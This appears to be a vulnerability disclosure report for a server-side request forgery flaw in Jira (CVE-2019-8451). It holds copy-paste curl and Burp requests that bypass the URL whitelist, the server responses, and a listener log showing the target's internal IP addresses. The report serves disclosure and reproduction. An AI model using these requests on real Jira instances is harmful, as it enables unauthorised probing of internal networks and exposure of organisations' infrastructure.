
# Jira SSRF vulnerability (CVE-2019-8451)


## Summary

The */plugins/servlet/gadgets/makeRequest* resource in Jira allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.


## Affected assets 

 - $URL

## Steps To Reproduce

First, the request to example.com works properly. But this seems intended because no other domain works. 

Request (copy and paste in Burp)
```
POST /plugins/servlet/gadgets/makeRequest?url=https://$DOMAIN:1337@example.com HTTP/1.1
Host: $DOMAIN
Connection: close
Accept: */*
Accept-Language: en
Connection: close
X-Atlassian-token: no-check
Content-Length: 4

TEST
```

**Response**
```
HTTP/1.1 200 OK
Cache-Control: public,max-age=408569
Content-Disposition: attachment;filename=p.txt
Content-Security-Policy: frame-ancestors 'self'
Content-Type: application/json;charset=UTF-8
Date: Fri, 02 Oct 2020 21:52:11 GMT
Expires: Wed, 07 Oct 2020 15:21:40 GMT
Server: Apache/2.4.6 (Red Hat Enterprise Linux) OpenSSL/1.0.2k-fips PHP/5.4.16
Set-Cookie: atlassian.xsrf.token=XXX; Path=/; Secure
X-AREQUESTID: 1432x1201669x1
X-ASEN: SEN-10457568
X-AUSERNAME: anonymous
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=edge
X-XSS-Protection: 1; mode=block
Connection: close
Content-Length: 1439
Strict-Transport-Security: max-age=31536000

throw 1; < don't be evil' >{"https://$DOMAIN:1337@example.com":{"rc":200,"headers":{},"body":"<!doctype html>\n<html>\n<head>\n    <title>Example Domain<\/title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n        \n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    <\/style>    \n<\/head>\n\n<body>\n<div>\n    <h1>Example Domain<\/h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.<\/p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...<\/a><\/p>\n<\/div>\n<\/body>\n<\/html>\n"}}
```


But I discovered a way to bypass the whitelist of sites allowed to be accessible. Just adding a :80 after the domain will allow the request to work. 

Let me explain you the POC:

1. Start a HTTP Server using python
``sudo python -m SimpleHTTPServer 80``

2. Run this command using curl (change SERVER)

 curl -i -s -k -X $'POST' -H $'Host: $DOMAIN' -H $'Connection: close' -H $'Accept: */*' -H $'Accept-Language: en' -H $'Connection: close' -H $'X-Atlassian-token: no-check' -H $'Content-Length: 4' --data-binary $'TEST' $'https://$DOMAIN/plugins/servlet/gadgets/makeRequest?url=https://$DOMAIN:1337@**SERVER**:80'

If you want to use Burp, copy and paste this request:

```
POST /plugins/servlet/gadgets/makeRequest?url=https://$DOMAIN:1337@$DOMAIN2:80 HTTP/1.1
Host: $DOMAIN
Connection: close
Accept: */*
Accept-Language: en
Connection: close
X-Atlassian-token: no-check
Content-Length: 4

TEST
```

**Output** 

 - Burp
``` 
HTTP/1.1 200 OK
Cache-Control: public,max-age=3600
Content-Disposition: attachment;filename=p.txt
Content-Security-Policy: frame-ancestors 'self'
Content-Type: application/json;charset=UTF-8
Date: Fri, 02 Oct 2020 20:44:15 GMT
Expires: Fri, 02 Oct 2020 21:44:15 GMT
Server: Apache/2.4.6 (Red Hat Enterprise Linux) OpenSSL/1.0.2k-fips PHP/5.4.16
Set-Cookie: atlassian.xsrf.token=XXX; Path=/; Secure
X-AREQUESTID: 1364x1197884x1
X-ASEN: SEN-10457568
X-AUSERNAME: anonymous
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=edge
X-XSS-Protection: 1; mode=block
Connection: close
Content-Length: 115
Strict-Transport-Security: max-age=31536000

throw 1; < don't be evil' >{"https://$DOMAIN:1337@$DOMAIN2:80":{"rc":500,"headers":{},"body":""}}
``` 

 - curl 
 ```
 HTTP/1.1 200 OK
Cache-Control: public,max-age=3600
Content-Disposition: attachment;filename=p.txt
Content-Security-Policy: frame-ancestors 'self'
Content-Type: application/json;charset=UTF-8
Date: Fri, 02 Oct 2020 21:14:26 GMT
Expires: Fri, 02 Oct 2020 22:14:26 GMT
Server: Apache/2.4.6 (Red Hat Enterprise Linux) OpenSSL/1.0.2k-fips PHP/5.4.16
Set-Cookie: atlassian.xsrf.token=XXX; Path=/; Secure
X-AREQUESTID: 1394x1199510x1
X-ASEN: SEN-10457568
X-AUSERNAME: anonymous
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=edge
X-XSS-Protection: 1; mode=block
Connection: close
Content-Length: 115
Strict-Transport-Security: max-age=31536000

throw 1; < don't be evil' >{"https://$DOMAIN:1337@$DOMAIN2:80":{"rc":500,"headers":{},"body":""}}
```

 **Server side ouput**

```
sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
62.52.253.144 - - [02/Oct/2020 20:43:39] code 400, message Bad request syntax ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x90\xf8')
62.52.253.144 - - [02/Oct/2020 20:43:39] "��_w��" 400 -
62.52.253.146 - - [02/Oct/2020 20:43:49] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x03\x8f\x10L\x9d\x1f%K')
+�[[K�X߱��#�y��Р?�V�$�(=�&�*kj�" 400 -49] "��_w��L�%K
62.52.253.144 - - [02/Oct/2020 20:43:55] code 400, message Bad request syntax ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x08\xa9\xa8\x14\xe9\x99\xa8\xfa\x12wj\x97\xad\xbcQw\x8d+A\xd7\xf4^\xa9\xdb^QX\xe5\x9b\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0')
62.52.253.144 - - [02/Oct/2020 20:43:55] "��_w��陨�wj���Qw�+A��^��^QX�V�$�(=�&�*kj�" 400 -
62.52.253.146 - - [02/Oct/2020 20:44:00] code 400, message Bad request syntax ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\r\xcaL\x0b\xe3!Ph\xa3\x9dc\xed%~\xcd\x9c1Tk?\t\x85V\xc8;\x8a \xf0\xb2\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0')
�L.52.253.146 - - [02/Oct/2020 20:44:00] "��_w�
  �!Ph��c�%~͜1Tk?	�V�;� �V�$�(=�&�*kj�" 400 -
62.52.253.147 - - [02/Oct/2020 20:44:06] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x13D\xad\xdb\xec<\xec\x80\x9e\x82')
62.52.253.147 - - [02/Oct/2020 20:44:06] "��_w�D���<쀞�	�-�E����f`�))p�C(V�$�(=�&�*kj�" 400 -
62.52.253.147 - - [02/Oct/2020 20:44:15] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x1c)\x01\xa2\x90?')
"�k��`t�>�w��Ǔ_řʞV�$�(=�&�*kj�" 400 -15] "��_w�)��?
62.52.253.144 - - [02/Oct/2020 20:44:18] code 400, message Bad request syntax ("\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x1fDs\xa5\xc5\xe9s\xb0\x88)\xd9'R\xef\x91\x16\xf0Hw3\xfb\xd3\xf1\xd7\xc3\xcb\xf6hW\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0")
62.52.253.144 - - [02/Oct/2020 20:44:18] "��_w�Ds���s��)�'R��Hw3�������hWV�$�(=�&�*kj�" 400 -
62.52.253.146 - - [02/Oct/2020 20:46:13] code 400, message Bad request syntax ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x92\xa2\'\x8a""nY,gz\xbb\x1e\xfb|b\xf7\x8c&\x1cZ\xc2\x03s@\xd9w\xae)\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0')
62.52.253.146 - - [02/Oct/2020 20:46:13] "��_w���'�""nY,gz��|b��&Z�s@�w�)V�$�(=�&�*kj�" 400 -
62.52.253.146 - - [02/Oct/2020 20:46:25] code 400, message Bad request syntax ("\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x91\x9e@\x91\xfd\xe7MBz\xb1`uN\x8b\x0f\x7f\xc8\xae\xb6\x13\xb9T2\xf7\x117K\xcd'^\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0")
62.52.253.146 - - [02/Oct/2020 20:46:25] "��_w��@���MBz�`uN�Ȯ��T2�7K�'^V�$�(=�&�*kj�" 400 -
62.52.253.145 - - [02/Oct/2020 20:56:30] code 400, message Bad request syntax ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x93\xfbt0\x93\x90\xa4\xc6t\xaa2j\xcf\x1a=\xfd{\x9f\x8bq8\xfc\x8c\xc8\x95\xe2\xae\xc6J\xfb\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0')
62.52.253.145 - - [02/Oct/2020 20:56:30] "��_w��t0����t�2j��=�{��q8��ȕ��J�V�$�(=�&�*kj�" 400 -
62.52.253.145 - - [02/Oct/2020 20:57:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x94=(')
62.52.253.145 - - [02/Oct/2020 20:57:36] "��_w�=(	`?ڠAU"�8�}:x�z(���;v�" 400 -
62.52.253.147 - - [02/Oct/2020 20:59:17] code 400, message Bad request syntax ("\x16\x03\x03\x00\xe0\x01\x00\x00\xdc\x03\x03_w\x94\xa2\xd8\xa7'\xcb\xc0\xfe\xccKb\xe2Ex\xbd\x9e\xaf\xc7?\xa5L\xe0^\xb4\xe9t'D\x1b\xbd\x00\x00V\xc0$\xc0(\x00=\xc0&\xc0*\x00k\x00j\xc0")
62.52.253.147 - - [02/Oct/2020 20:59:17] "��_w��ا'����Kb�Ex����?�L�^��t'DV�$�(=�&�*kj�" 400 - 
```
**Pay attention to the IP addresses.**

The output is scrambled because it's a HTTPs request sent to a HTTP server. (Testing the same using HTTPS didn't work) 


## Impact

The request reveals many IP addresses from the company. The scope of the SSRF is limited but still source to perform different crafted attacks. 


### Supporting Material/References:

 - [NVD CVE](https://nvd.nist.gov/vuln/detail/CVE-2019-8451)
 - [JIRA](https://jira.atlassian.com/browse/JRASERVER-69793)
 - [SSRF](https://portswigger.net/web-security/ssrf) 

